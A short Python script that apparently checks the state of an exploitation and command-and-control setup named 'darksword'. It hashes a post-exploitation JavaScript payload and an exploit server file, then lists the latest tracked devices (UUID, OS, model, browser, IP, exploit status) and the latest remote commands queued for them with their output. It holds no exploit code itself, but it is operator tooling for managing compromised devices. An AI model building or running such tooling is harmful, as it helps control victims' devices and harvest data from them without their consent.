# -*- coding: utf-8 -*-
import hashlib, sqlite3, os
pe = open('payloads/post_exploit.js','rb').read()
es = open('exploit_server.py','rb').read()
print('post_exploit.js  SIZE=%d  MD5=%s' % (len(pe), hashlib.md5(pe).hexdigest()))
print('exploit_server.py SIZE=%d  MD5=%s' % (len(es), hashlib.md5(es).hexdigest()))

conn = sqlite3.connect('darksword.db')
c = conn.cursor()
print()
print('=== devices actual columns (via PRAGMA) ===')
for r in c.execute('PRAGMA table_info(devices)').fetchall():
    print(' ', r)
print()
print('=== commands columns ===')
for r in c.execute('PRAGMA table_info(commands)').fetchall():
    print(' ', r)
print()
print('=== Current devices (latest 20) ===')
rs = c.execute('SELECT device_uuid, os_version, device_model, browser_name, ip, datetime(last_seen,"unixepoch","localtime"), exploit_status, last_cmd_idle_at FROM devices ORDER BY last_seen DESC LIMIT 20').fetchall()
for r in rs:
    idle = (str(r[7])[:16]) if r[7] else 'None'
    print('  UUID=%-22s... OS=%-8s MDL=%-18s BR=%-12s IP=%-15s LAST=%s EXP=%s IDLE_AT=%s' % (str(r[0])[:22], str(r[1] or 'null'), str(r[2] or 'null'), str(r[3] or 'null'), str(r[4] or '?'), r[5], r[6], idle))
print()
print('=== Current commands (latest 20) ===')
rs2 = c.execute('SELECT id, substr(device_uuid,1,18), command, status, substr(coalesce(output,""),1,120), datetime(created_at,"unixepoch","localtime"), datetime(executed_at,"unixepoch","localtime") FROM commands ORDER BY id DESC LIMIT 20').fetchall()
print('%-6s %-20s %-22s %-12s %-120s %-20s %-20s' % ('ID','DEV','CMD','STATUS','OUTPUT[:120]','CREATED_AT','EXECUTED_AT'))
for r in rs2:
    print('%-6s %-20s %-22s %-12s %-120s %-20s %-20s' % tuple([str(x if x is not None else '') for x in r]))
conn.close()
